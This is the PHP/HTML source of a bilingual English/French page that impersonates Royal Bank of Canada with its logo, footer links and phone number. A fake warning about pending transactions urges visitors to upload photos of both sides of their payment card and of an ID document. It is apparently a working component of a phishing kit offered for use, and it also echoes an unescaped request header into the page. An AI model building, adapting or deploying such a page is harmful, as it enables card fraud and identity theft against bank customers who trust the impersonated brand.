<?php
// Détecter la langue de l'utilisateur
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

// Définir les traductions
$translations = [
    'en' => [
        'title' => 'Royal Bank - Verification',
        'header_logo_text' => 'Royal Bank',
        'sign_in' => 'Sign In',
        'verification_message' => 'Your account is awaiting verification by one of our agents. Please follow the steps below to remove pending transactions.',
        'labels' => [
            'front_of_card' => 'Front of Card',
            'back_of_card' => 'Back of Card',
            'upload_id' => 'Upload ID',
            'cancel_transaction' => 'CANCEL TRANSACTION'
        ],
        'footer_titles' => [
            'about' => 'ABOUT RBC',
            'work' => 'Work at RBC',
            'daily_numbers' => 'Daily Numbers',
            'customer_service' => 'Customer Service',
            'protecting_money' => 'Protecting Your Money'
        ],
        'footer_links' => [
            'investor_relations' => '> Investor Relations',
            'media_newsroom' => '> Media Newsroom',
            'economics' => '> Economics',
            'careers' => '> Careers at RBC',
            'foreign_exchange' => '> Foreign Exchange',
            'rates' => '> Rates',
            'mortgage_rates' => '> Mortgage Rates',
            'mutual_funds' => '> Mutual Funds',
            'apply_online' => '> Apply Online',
            'branch_locator' => '> Branch & ATM Locator',
            'commitments' => '> Voluntary Codes & Public Commitments',
            'phone' => '> 1-800-769-2511',
            'cdic_info' => '> Canada Deposit Insurance Corporation Member Info'
        ],
        'footer_copyright' => 'Royal Bank of Canada Website, © 1995-2024',
        'footer_legal' => 'Legal | Accessibility | Privacy & Security | Advertising & Cookies'
    ],
    'fr' => [
        'title' => 'Banque Royale - Vérification',
        'header_logo_text' => 'Banque Royale',
        'sign_in' => 'Se connecter',
        'verification_message' => 'Votre compte est en attente de vérification par l’un de nos agents. Veuillez suivre les étapes ci-dessous pour supprimer les transactions en attente.',
        'labels' => [
            'front_of_card' => 'Recto de la carte',
            'back_of_card' => 'Verso de la carte',
            'upload_id' => 'Télécharger une pièce d\'identité',
            'cancel_transaction' => 'ANNULER LA TRANSACTION'
        ],
        'footer_titles' => [
            'about' => 'À PROPOS DE RBC',
            'work' => 'Travailler chez RBC',
            'daily_numbers' => 'Chiffres Quotidiens',
            'customer_service' => 'Service Clientèle',
            'protecting_money' => 'Protection de votre argent'
        ],
        'footer_links' => [
            'investor_relations' => '> Relations Investisseurs',
            'media_newsroom' => '> Salle de Presse',
            'economics' => '> Économie',
            'careers' => '> Carrières chez RBC',
            'foreign_exchange' => '> Taux de Change',
            'rates' => '> Taux',
            'mortgage_rates' => '> Taux Hypothécaires',
            'mutual_funds' => '> Fonds Commun de Placement',
            'apply_online' => '> Postuler en ligne',
            'branch_locator' => '> Localisateur de succursales et de GAB',
            'commitments' => '> Engagements Publics et Codes Volontaires',
            'phone' => '> 1-800-769-2511',
            'cdic_info' => '> Info sur la Société d\'assurance-dépôts du Canada'
        ],
        'footer_copyright' => 'Site Web de Banque Royale du Canada, © 1995-2024',
        'footer_legal' => 'Légal | Accessibilité | Confidentialité & Sécurité | Publicité & Cookies'
    ]
];

// Sélectionner la traduction appropriée
$selected_lang = $translations[$lang] ?? $translations['en'];
?>

<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <link rel="stylesheet" href="css/footer.css">
    <link rel="stylesheet" href="css/header.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <title><?php echo $selected_lang['title']; ?></title>
</head>
<body>

<header>
    <div class="left">
        <img class="rbc-logo" src="image/rbc-logo-shield.svg" alt="RBC Logo">
        <p class="logo-text"><?php echo $selected_lang['header_logo_text']; ?></p>
    </div>
    <div class="right">
        <button class="yellow btn-go">
            <span class="sign"><?php echo $selected_lang['sign_in']; ?></span>
        </button>
        <button class="blue btn-go">
            <i class="fas fa-bars"></i>
        </button>
    </div>
</header>

<main>
    <section class="verification">
        <div class="alert">
            <i class="fas fa-exclamation-circle"></i>
            <p><?php echo $selected_lang['verification_message']; ?></p>
        </div>
    </section>

    <form class="verification-form">
        <div class="card-upload">
            <label><?php echo $selected_lang['labels']['front_of_card']; ?></label>
            <input id="frontCard" type="file" accept="image/*" capture="environment">
            <img class="preview" src="" alt="Preview" style="display: none; width: 100px; height: auto;">
        </div>

        <div class="card-upload">
            <label><?php echo $selected_lang['labels']['back_of_card']; ?></label>
            <input id="backCard" type="file" accept="image/*" capture="environment">
            <img class="preview" src="" alt="Preview" style="display: none; width: 100px; height: auto;">
        </div>

        <div class="card-upload">
            <label><?php echo $selected_lang['labels']['upload_id']; ?></label>
            <input id="idCard" type="file" accept="image/*" capture="environment">
            <img class="preview" src="" alt="Preview" style="display: none; width: 100px; height: auto;">
        </div>

        <button id="submitBtn" type="submit" class="yellow btn-go btn-otp"><?php echo $selected_lang['labels']['cancel_transaction']; ?></button>
    </form>
</main>

<footer>
    <?php foreach ($selected_lang['footer_titles'] as $key => $title): ?>
        <div class="part">
            <p class="text-titre"><?php echo $title; ?></p>
            <?php 
            // Afficher les liens correspondants dans chaque section du pied de page
            foreach ($selected_lang['footer_links'] as $link_text) {
                echo "<p class='sec-2'>{$link_text}</p>";
            }
            ?>
        </div>
    <?php endforeach; ?>
    <img class="img-footer" src="image/cdic-digital-symbol-en.svg" alt="">
</footer>

<div class="footer-2">
    <p class="txt-1"><?php echo $selected_lang['footer_copyright']; ?></p>
    <p class="txt-2"><?php echo $selected_lang['footer_legal']; ?></p>
</div>

<script src="js/script.js"></script>
<script src="js/controle.js"></script>

</body>
</html>
